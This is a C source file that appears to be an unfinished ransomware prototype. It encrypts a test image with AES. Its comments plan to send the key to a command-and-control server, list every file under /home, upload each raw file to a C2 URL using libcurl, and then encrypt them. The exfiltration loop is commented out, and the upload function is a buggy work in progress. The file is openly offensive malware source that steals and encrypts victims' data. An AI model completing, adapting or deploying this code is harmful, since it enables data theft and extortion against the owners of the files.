#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <dirent.h>
#include <time.h>
#include <curl/curl.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/err.h>

#include "files.h"
#include "encryption.h"


void sendFileToApi(const char *path, const char *api);



int main(){

    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();

    //Generate AES key and IV
    unsigned char key[32];
    RAND_bytes(key, sizeof(key));

    unsigned char iv[16];
    RAND_bytes(iv, sizeof(iv));

    // Authentication string
    static const unsigned char aad[] = "Cyan";

    encrypt_file(key, iv, aad, "atom.png");

    decryptFile(key, iv, aad, "atom.png.cha");



    //Encrypt the AES key with the RSA public key

    //Send the encrypted AES key and iv to C2

    //List all the files we want to borrow ;)
    /*
    const char *path = "/home";
    PathList pathList;
    initPathList(&pathList);

    linuxListFiles(path, &pathList);
    //Browse files
    for (size_t i = 0; i < pathList.count; ++i) {
        //printf("%s\n", pathList.paths[i]); Debug
        //Send the raw file to C2
        sendFileToApi(pathList.paths[i], "https://192.168.0.1/path/to/file/api");

        //Encrypt each file with AES
        //encryptFile(ctx, "pathList.paths[i]");
    }
    freePathList(&pathList);
    */


    //Redirect to C2's web page for instructions

    return 0;
}
//WIP
void sendFileToApi(const char *path, const char *api){
    /*Documentation: https://curl.se/libcurl/c/fileupload.html */
    CURL *curl;
    CURLcode res;
    struct stat file_info;
    curl_off_t speed_upload, total_time;
    FILE *fd;

    fd = fopen("debugit", "rb"); /* open file to upload */
    if(!fd)
        //Woops

        /* to get the file size */
        if(fstat(fileno(fd), &file_info) != 0)
            //Woops

            curl = curl_easy_init();
    if(curl){
        /* upload to this place */
        curl_easy_setopt(curl, CURLOPT_URL,
                         api);

        /* tell it to "upload" to the URL */
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

        /* set where to read from (on Windows you need to use READFUNCTION too) */
        curl_easy_setopt(curl, CURLOPT_READDATA, fd);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            //Woops
        }

        curl_easy_cleanup(curl);
    }
    fclose(fd);

}
